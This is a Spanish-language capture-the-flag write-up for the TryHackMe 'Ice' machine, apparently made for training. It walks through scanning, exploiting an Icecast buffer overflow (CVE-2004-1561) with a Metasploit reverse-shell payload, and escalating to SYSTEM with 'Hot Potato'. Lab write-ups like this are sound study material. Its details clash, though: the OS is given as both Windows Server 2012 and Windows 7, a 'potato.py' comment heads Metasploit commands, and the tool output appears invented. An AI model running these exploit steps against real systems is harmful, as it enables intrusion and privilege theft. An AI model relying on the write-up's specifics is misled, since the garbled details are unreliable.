# 🖥️ THM: Ice

## Metadatos

| Campo | Valor |
|-------|-------|
| **Máquina** | Ice |
| **Plataforma** | TryHackMe |
| **Dificultad** | Easy |
| **Categoría** | Windows / Metasploit |
| **IP** | 10.10.x.x |
| **OS** | Windows Server 2012 |
| **Fecha** | 2024 |
| **Tiempo** | 45 min |

---

## 🎯 Resumen Ejecutivo

> Exploté **Icecast (CVE-2004-1561)** para obtener acceso inicial, luego escalé via **Hot Potato (CVE-2016-3225)** para obtener SYSTEM.

---

## 🔍 Reconocimiento

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap_ice.txt 10.10.x.x
```

| Puerto | Servicio | Versión | Estado |
|--------|----------|---------|--------|
| 135 | MSRPC | Microsoft Windows RPC | Open |
| 139 | SMB | Microsoft Windows 7 | Open |
| 445 | SMB | Microsoft Windows 7 | Open |
| 3389 | RDP | Microsoft Terminal Services | Open |
| 8000 | HTTP | Icecast 2.3.3 | Open |

**Hallazgo clave:** Icecast 2.3.3 en puerto 8000.

---

## 💥 Explotación

### Vulnerabilidad

**CVE:** CVE-2004-1561
**Tipo:** Buffer Overflow en Icecast
**CVSS:** 7.5

### Payload

```bash
msfconsole
use exploit/windows/http/icecast_header
set RHOSTS 10.10.x.x
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.x.x
exploit
```

**Resultado:**
```
[*] Started reverse TCP handler
[*] Icecast header overflow...
[*] Meterpreter session 1 opened
```

---

## 🚀 Escalada de Privilegios

### Hot Potato (NBNS Spoofing + NTLM Relay)

```bash
# Usar potato.py
use exploit/windows/local/hot_potato
set SESSION 1
set LHOST 10.10.x.x
exploit
```

**Resultado:**
```
[*] Potato running as SESSION 2
[*] SYSTEM shell obtained!
```

---

## 🏁 Flags

| Flag | Valor | Ubicación |
|------|-------|-----------|
| **User** | `FLAG{...}` | `C:\Users\spotter\Desktop\user.txt` |
| **Root** | `FLAG{...}` | `C:\Users\Administrator\Desktop\root.txt` |

---

## 🛡️ Lecciones Aprendidas

### ✅ Lo que funcionó
- Icecast tiene exploit directo en Metasploit
- Hot Potato funciona en Windows sin parches
- Escalada en 2 pasos simples

### 🔄 Qué haría diferente
- Verificar parches de Windows antes de intentar exploits
- Usar WinPEAS para automatizar enumeración

---

*Writeup creado para CDPN — Nivel Fácil*
